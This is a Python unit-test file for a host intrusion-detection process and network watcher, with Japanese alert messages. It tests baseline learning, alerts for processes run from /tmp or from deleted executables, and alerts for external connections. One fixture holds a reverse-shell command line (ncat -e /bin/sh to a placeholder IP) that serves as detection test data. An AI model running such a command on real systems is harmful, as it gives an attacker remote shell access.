import os
import sys
import tempfile
import types
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "app"))


class FakeProc:
    def __init__(self, pid, name, cmdline, exe=""):
        self.info = {"pid": pid, "name": name, "cmdline": cmdline.split(), "exe": exe}

    def cpu_percent(self, interval=None):
        return 0.0


class FakeConn:
    def __init__(self, pid, ip):
        self.status = "ESTABLISHED"
        self.pid = pid
        self.raddr = types.SimpleNamespace(ip=ip, port=443)
        self.laddr = types.SimpleNamespace(ip="192.168.0.5", port=50000)


def make_fake_psutil(procs, conns=None):
    ns = types.SimpleNamespace()
    ns.CONN_LISTEN = "LISTEN"
    ns.CONN_ESTABLISHED = "ESTABLISHED"
    ns.AccessDenied = type("AccessDenied", (Exception,), {})
    ns.NoSuchProcess = type("NoSuchProcess", (Exception,), {})
    ns.cpu_count = lambda: 4
    ns.process_iter = lambda attrs=None: iter(procs)
    ns.net_connections = lambda kind="inet": conns or []
    return ns


class Collector:
    def __init__(self):
        self.alerts = []

    def alert(self, category, message, severity="warning", **kw):
        self.alerts.append((severity, message))

    def sev(self):
        return [s for s, _ in self.alerts]


class ProcNetIdentityTest(unittest.TestCase):
    def setUp(self):
        os.environ["HITIDS_DATA_DIR"] = tempfile.mkdtemp()
        sys.modules.pop("paths", None)
        sys.modules.pop("procnet_watch", None)
        import procnet_watch
        self.pw = procnet_watch
        self.pw.STATE_PATH = os.path.join(tempfile.mkdtemp(), "state.json")
        self.notifier = Collector()

    def watcher(self, procs, conns=None):
        self.pw.psutil = make_fake_psutil(procs, conns or [])
        return self.pw.ProcNetWatcher({"known_process_keywords": ["sshd"], "known_listen_ports": []}, self.notifier)

    def test_baseline_run_is_silent_for_normal_processes(self):
        w = self.watcher([FakeProc(1, "myapp", "/opt/myapp --serve", "/opt/myapp")])
        w.check()
        self.assertEqual([m for s, m in self.notifier.alerts if s != "info"], [])
        self.assertTrue(any("基準を登録" in m for _, m in self.notifier.alerts))

    def test_session_processes_with_new_pids_do_not_alert_repeatedly(self):
        w = self.watcher([FakeProc(10, "sshd", "sshd: hit")])
        w.check()
        self.notifier.alerts.clear()
        # ログインのたびに新しいpidで同じ種類のプロセスが立ち上がる
        for i in range(5):
            w.check()
            self.pw.psutil = make_fake_psutil([
                FakeProc(1000 + i, "(sd-pam)", "(sd-pam)", ""),
                FakeProc(2000 + i, "pipewire", "/usr/bin/pipewire", "/usr/bin/pipewire"),
                FakeProc(3000 + i, "snapd-desktop-integration", f"/snap/snapd-desktop-integration/{253 + i}/usr/bin/x", ""),
            ], [])
            w.check()
        # (sd-pam)/pipewireは既知、snapd-desktop-integrationは新しい種類として1回だけINFO
        self.assertEqual(self.notifier.sev(), ["info"])

    def test_new_unknown_process_is_info_once(self):
        w = self.watcher([FakeProc(1, "sshd", "sshd")])
        w.check()
        self.notifier.alerts.clear()
        self.pw.psutil = make_fake_psutil([FakeProc(5, "mytool", "mytool --x", "/usr/local/bin/mytool")])
        w.check()
        w.check()
        self.assertEqual(self.notifier.sev(), ["info"])
        self.assertIn("新しい種類のプロセス", self.notifier.alerts[0][1])

    def test_process_running_from_tmp_is_warning(self):
        w = self.watcher([FakeProc(1, "sshd", "sshd")])
        w.check()
        self.notifier.alerts.clear()
        self.pw.psutil = make_fake_psutil([FakeProc(9, "x", "/tmp/x", "/tmp/x")])
        w.check()
        self.assertEqual(self.notifier.sev(), ["warning"])
        self.assertIn("一時領域", self.notifier.alerts[0][1])
        self.assertIn("未知のプロセスを検知: pid=9 name=x", self.notifier.alerts[0][1])

    def test_builtin_known_name_masquerading_from_tmp_is_still_warning(self):
        w = self.watcher([FakeProc(1, "sshd", "sshd")])
        w.check()
        self.notifier.alerts.clear()
        self.pw.psutil = make_fake_psutil([FakeProc(9, "pipewire", "/tmp/pipewire", "/tmp/pipewire")])
        w.check()
        self.assertEqual(self.notifier.sev(), ["warning"])

    def test_deleted_executable_and_attack_tool_names_are_warning(self):
        w = self.watcher([FakeProc(1, "sshd", "sshd")])
        w.check()
        self.notifier.alerts.clear()
        self.pw.psutil = make_fake_psutil([
            FakeProc(20, "updater", "/usr/bin/updater", "/usr/bin/updater (deleted)"),
            FakeProc(21, "ncat", "ncat -e /bin/sh 203.0.113.5 4444", "/usr/bin/ncat"),
        ])
        w.check()
        self.assertEqual(self.notifier.sev(), ["warning", "warning"])

    def test_unknown_process_talking_to_external_host_is_warning(self):
        w = self.watcher([FakeProc(1, "sshd", "sshd")])
        w.check()
        self.notifier.alerts.clear()
        self.pw.psutil = make_fake_psutil(
            [FakeProc(30, "beacon", "beacon", "/usr/local/bin/beacon")], [FakeConn(30, "93.184.216.34")])
        w.check()
        self.assertEqual(self.notifier.sev(), ["warning"])
        self.assertIn("外部のアドレスへ通信中", self.notifier.alerts[0][1])

    def test_known_process_with_external_connection_is_not_flagged(self):
        w = self.watcher([FakeProc(1, "sshd", "sshd")])
        w.check()
        self.notifier.alerts.clear()
        self.pw.psutil = make_fake_psutil(
            [FakeProc(40, "sshd", "sshd: hit@pts/1", "/usr/sbin/sshd")], [FakeConn(40, "93.184.216.34")])
        w.check()
        self.assertEqual(self.notifier.alerts, [])

    def test_legacy_state_is_migrated_as_silent_baseline(self):
        import json
        with open(self.pw.STATE_PATH, "w") as f:
            json.dump({"known_ports_seen": [], "alerted_pids": [1, 2, 3]}, f)
        w = self.watcher([FakeProc(7, "myapp", "myapp", "/opt/myapp")])
        w.check()
        self.assertEqual([s for s in self.notifier.sev() if s != "info"], [])
        with open(self.pw.STATE_PATH) as f:
            state = json.load(f)
        self.assertIn("seen_identities", state)
        self.assertNotIn("alerted_pids", state)


if __name__ == "__main__":
    unittest.main()
